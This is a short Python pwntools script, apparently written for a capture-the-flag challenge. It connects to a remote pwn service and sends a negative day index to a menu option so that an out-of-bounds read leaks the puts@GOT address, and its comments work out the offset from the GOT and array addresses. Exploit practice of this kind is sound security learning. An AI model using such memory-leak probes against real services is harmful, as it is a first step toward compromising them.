#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

HOST = 'pwn.runa2025.kr'
PORT = 7004

p = remote(HOST, PORT)

# Try to show day=-2 to leak GOT
# puts@GOT = 0x405008
# g_names = 0x4050a0
# offset = -152 = -2 * 88 + (11-8)*8
log.info("Attempting to leak puts@GOT with day=-2...")

p.recvuntil(b'>')
p.sendline(b'2')  # Show
p.recvuntil(b':')
p.sendline(b'-2')  # day = -2

try:
    data = p.recvuntil(b'>', timeout=3)
    log.info(f"Received data:\n{data}")
    
    # Look for the leaked address
    if b'-2' in data or b'Sun' not in data:
        log.success("Seems like something different happened!")
except Exception as e:
    log.error(f"Exception: {e}")

p.close()
